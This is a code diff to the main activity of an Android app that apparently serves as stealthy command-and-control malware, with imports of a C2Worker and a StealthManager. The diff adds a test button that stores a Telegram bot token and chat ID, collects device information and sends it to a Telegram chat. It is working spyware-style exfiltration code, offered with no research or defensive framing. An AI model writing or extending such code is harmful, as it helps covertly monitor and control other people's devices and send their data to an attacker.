@@ -27,6 +27,11 @@ import androidx.work.ExistingPeriodicWorkPolicy
 import java.util.concurrent.TimeUnit
 import com.zero.sentinel.workers.C2Worker
 import com.zero.sentinel.utils.StealthManager
+import com.zero.sentinel.network.TelegramClient
+import com.zero.sentinel.utils.DeviceInfoHelper
+import kotlinx.coroutines.CoroutineScope
+import kotlinx.coroutines.Dispatchers
+import kotlinx.coroutines.launch
 
 class MainActivity : AppCompatActivity() {
 
@@ -37,6 +42,7 @@ class MainActivity : AppCompatActivity() {
     private lateinit var botTokenInput: EditText
     private lateinit var chatIdInput: EditText
     private lateinit var saveButton: Button
+    private lateinit var testButton: Button
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
@@ -51,6 +57,7 @@ class MainActivity : AppCompatActivity() {
         botTokenInput = findViewById(R.id.et_bot_token)
         chatIdInput = findViewById(R.id.et_chat_id)
         saveButton = findViewById(R.id.btn_save_connection)
+        testButton = findViewById(R.id.btn_test_connection)
 
         val prefsManager = com.zero.sentinel.data.EncryptedPrefsManager(this)
 
@@ -77,6 +84,28 @@ class MainActivity : AppCompatActivity() {
                     ExistingPeriodicWorkPolicy.UPDATE,
                     workRequest
                 )
+            } else {
+                Toast.makeText(this, "Please enter both Token and Chat ID", Toast.LENGTH_SHORT).show()
+            }
+        }
+
+        // Test Connection
+        testButton.setOnClickListener {
+            val token = botTokenInput.text.toString()
+            val chat = chatIdInput.text.toString()
+
+            if (token.isNotEmpty() && chat.isNotEmpty()) {
+                prefsManager.saveBotToken(token)
+                prefsManager.saveChatId(chat)
+                
+                Toast.makeText(this, "Sending Device Info...", Toast.LENGTH_SHORT).show()
+                
+                val client = TelegramClient(this)
+                val info = DeviceInfoHelper.getDeviceInfo()
+                
+                CoroutineScope(Dispatchers.IO).launch {
+                    client.sendMessage("🔔 *TEST CONNECTION*\n\n$info")
+                }
             } else {
                 Toast.makeText(this, "Please enter both Token and Chat ID", Toast.LENGTH_SHORT).show()
             }
